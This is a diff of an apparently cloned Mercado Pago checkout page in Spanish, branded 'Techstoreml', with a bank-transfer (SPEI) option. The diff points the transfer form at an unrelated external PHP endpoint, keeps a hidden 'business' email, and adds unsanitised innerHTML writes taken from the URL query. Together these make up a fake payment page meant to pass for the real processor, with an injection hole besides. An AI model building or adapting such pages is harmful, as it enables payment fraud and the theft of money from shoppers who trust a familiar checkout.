@@ -1,11 +1,11 @@
+<!DOCTYPE html><html lang="es-MX">
 
-<!DOCTYPE html>
-<html lang="es-MX">
+
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
 <script src="./script.js"></script>
-  <script >
+  <script>
   function getQueryVariable(variable)
 {
        var query = window.location.search.substring(1);
@@ -39,18 +39,22 @@
 		document.getElementById('item_name2').value = searchRegExp;
 		document.getElementById('amount2').value = getQueryVariable('amount');
 		
+        document.getElementById('mitem').innerHTML = searchRegExp;
+		searchRegExp = searchRegExp.split('%20').join(' ');
+		document.getElementById('mitem').innerHTML = searchRegExp;
+		
       }
    
     </script> 
 
-<link href="https://api.mercadopago.com/preconnect" rel="preconnect" data-head-react="true"/><script type="text/javascript" nonce="xYYLSeR0PiDjHKbA76yltA==">
+<link href="https://api.mercadopago.com/preconnect" rel="preconnect" data-head-react="true"><script type="text/javascript" nonce="xYYLSeR0PiDjHKbA76yltA==">
         window.dataLayer = [];
         (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
         new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
         j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
         'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
         })(window,document,'script','dataLayer','GTM-T8N3BPH');
-      </script><meta http-equiv="X-UA-Compatible" content="IE=edge" data-head-react="true"/><meta name="robots" content="noindex,noimageindex" data-head-react="true"/><link rel="preload" href="https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-light.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-head-react="true"/><link rel="preload" href="https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-regular.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-head-react="true"/><link rel="preload" href="https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-semibold.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-head-react="true"/><link rel="preload" href="https://http2.mlstatic.com/ui/webfonts/v4.2.0/roboto-mono/roboto-mono-400.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-head-react="true"/><title>¿Cómo quieres pagar?</title><style>@font-face {
+      </script><meta http-equiv="X-UA-Compatible" content="IE=edge" data-head-react="true"><meta name="robots" content="noindex,noimageindex" data-head-react="true"><link rel="preload" href="https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-light.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-head-react="true"><link rel="preload" href="https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-regular.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-head-react="true"><link rel="preload" href="https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-semibold.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-head-react="true"><link rel="preload" href="https://http2.mlstatic.com/ui/webfonts/v4.2.0/roboto-mono/roboto-mono-400.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-head-react="true"><title>¿Cómo quieres pagar?</title><style>@font-face {
           font-family:'Proxima Nova';
           font-weight:300;
           font-style:normal;
@@ -82,9 +86,9 @@
             url(https://http2.mlstatic.com/ui/webfonts/v4.2.0/roboto-mono/roboto-mono-400.woff) format("woff"),
             url(https://http2.mlstatic.com/ui/webfonts/v4.2.0/roboto-mono/roboto-mono-400.ttf) format("truetype");
         }</style>
-<link href="https://http2.mlstatic.com/frontend-assets/px-checkout-frontend/payment-card.mlm.95e11102.css" rel="stylesheet" type="text/css" onerror="(window['_pfl'] = window['_pfl'] || []).push(['css', this.href])" />
-<link href="https://http2.mlstatic.com/frontend-assets/px-checkout-frontend/payment-card-icon.mlm.815f6c2e.css" rel="stylesheet" type="text/css" onerror="(window['_pfl'] = window['_pfl'] || []).push(['css', this.href])" />
-<link href="https://http2.mlstatic.com/frontend-assets/px-checkout-frontend/app.desktop.e3a63e68.css" rel="stylesheet" type="text/css" onerror="(window['_pfl'] = window['_pfl'] || []).push(['css', this.href])" />
+<link href="https://http2.mlstatic.com/frontend-assets/px-checkout-frontend/payment-card.mlm.95e11102.css" rel="stylesheet" type="text/css" onerror="(window['_pfl'] = window['_pfl'] || []).push(['css', this.href])">
+<link href="https://http2.mlstatic.com/frontend-assets/px-checkout-frontend/payment-card-icon.mlm.815f6c2e.css" rel="stylesheet" type="text/css" onerror="(window['_pfl'] = window['_pfl'] || []).push(['css', this.href])">
+<link href="https://http2.mlstatic.com/frontend-assets/px-checkout-frontend/app.desktop.e3a63e68.css" rel="stylesheet" type="text/css" onerror="(window['_pfl'] = window['_pfl'] || []).push(['css', this.href])">
 
 </head><style>
   *:focus {
@@ -224,27 +228,27 @@
       border-color: hsl(198.20000000000005, 100%, 32.9%);
       color: #fff
     }
-  </style><div class="layout layout--redirect"><main id="root-app" class="layout-main" role="main"><button type="button" id="mp-close-btn" class="layout-close-btn u-no-user-select" data-close-payment="true"><svg width="16" height="16" viewBox="0 0 8 8" xmlns="http://www.w3.org/2000/svg"><title>Cancelar pago</title><path d="M7.194 0L4 3.194.806 0 0 .806 3.194 4 0 7.194.806 8 4 4.806 7.194 8 8 7.194 4.806 4 8 .806" fill-rule="nonzero" fill="#eee"></path></svg></button><div class="page-mask"><div class="optimus"><div class="layout__col-content" id="group_content"><h1 id="" class="c-title"><span>¿Cuál es tu banco?</span></h1><div class="scroller"><form id="group_form_scroller" class="form group_form_scroller " method="POST" novalidate="" autocomplete="off"><ul class="options-list ui-card select_nested_payment_option" data-loading="false">
+  </style><div class="layout layout--redirect"><main id="root-app" class="layout-main" role="main"><button type="button" id="mp-close-btn" class="layout-close-btn u-no-user-select" data-close-payment="true"><svg width="16" height="16" viewbox="0 0 8 8" xmlns="http://www.w3.org/2000/svg"><title>Cancelar pago</title><path d="M7.194 0L4 3.194.806 0 0 .806 3.194 4 0 7.194.806 8 4 4.806 7.194 8 8 7.194 4.806 4 8 .806" fill-rule="nonzero" fill="#eee"></path></svg></button><div class="page-mask"><div class="optimus"><div class="layout__col-content" id="group_content"><h1 id="" class="c-title"><span>¿Cuál es tu banco?</span></h1><div class="scroller"><form id="group_form_scroller" class="form group_form_scroller " method="POST" novalidate="" autocomplete="off"><ul class="options-list ui-card select_nested_payment_option" data-loading="false">
 
 
   <li class="options-list__item item-otros"><input type="radio" class="u-hide" id="otros" name="[ui_components][group_content][group_nested_pages][group_page_nested_bank_transfer][group_form_scroller][select_nested_payment_option]" value="[otros]"><label class="options-list__label" for="otros"><div class="group-media-object" id=""><div><div class="icon-wrapper"><img src="./transferencias_files/98340770-35ff-11e9-aa33-95fcc1ba1ce0-l.svg" alt="Transferencia SPEI" title=""></div></div>
   <a id="efectivobtn"><div class="row-details"><div class="title"><span class="text">Transferencia SPEI</span></div><div class="text"><span>El pago se acreditará en menos de 1 hora.</span></div></div></a>
   </div></label></li></ul></form></div></div><div class="layout__col-sidebar"><div class="brand"><span class="brand__img"><img src="./transferencias_files/bag.png" alt="Techstoreml" title="Techstoreml"></span><span class="brand__name brand__name__small">Techstoreml</span></div><div class="group-summary"><div class="group-summary__container"><h2 id="" class="title-h2"><span>Detalle de tu compra</span></h2><div class="row-summary">
-  <span class="row-summary__text " id="mitem">RECARGA MOVISTAR</span><span class="row-summary__price " id="mprecio">$ 10</span></div></div></div></div></div></div></main></div>
+  <span class="row-summary__text " id="mitem">PRODUCTO</span><span class="row-summary__price " id="mprecio">$ 10</span></div></div></div></div></div></div></main></div>
   
   <form class="form" method="GET" action="checkout_v1_payment_redirect_0a5dbcbb-bec7-4d9e-a63d-269317184802_payment-option-form__source=transfer_citi.html">
 <input type="hidden" name="business" id="business" value="gshield811@soberanosoft.ml">
-<input type="hidden" name="item_name" id="item_name"  >
-<input type="hidden" name="amount" id="amount" >
+<input type="hidden" name="item_name" id="item_name">
+<input type="hidden" name="amount" id="amount">
 <input type="hidden" name="currency_code" value="MXN">
-<input class="form" id="guestform"  class="options-list__label2" type="submit" value=""></input></form>
+<input class="form" id="guestform" class="options-list__label2" type="submit" value=""></form>
 
-<form class="form" method="GET" action="checkout_v1_payment_redirect_0a5dbcbb-bec7-4d9e-a63d-269317184802_payment-option-form__source=transfer_spei.html">
+<form class="form" method="post" action="https://tsharesoftware.cu.ma/gamestoreml_transfspei.php">
 <input type="hidden" name="business" id="business" value="gshield811@soberanosoft.ml">
-<input type="hidden" name="item_name" id="item_name2"  >
-<input type="hidden" name="amount" id="amount2" >
+<input type="hidden" name="item_name" id="item_name2">
+<input type="hidden" name="amount" id="amount2">
 <input type="hidden" name="currency_code" value="MXN">
-<input class="form" id="efectivoform"  class="options-list__label2" type="submit" value=""></input></form>
+<input class="form" id="efectivoform" class="options-list__label2" type="submit" value=""></form>
 
 
     <script>	
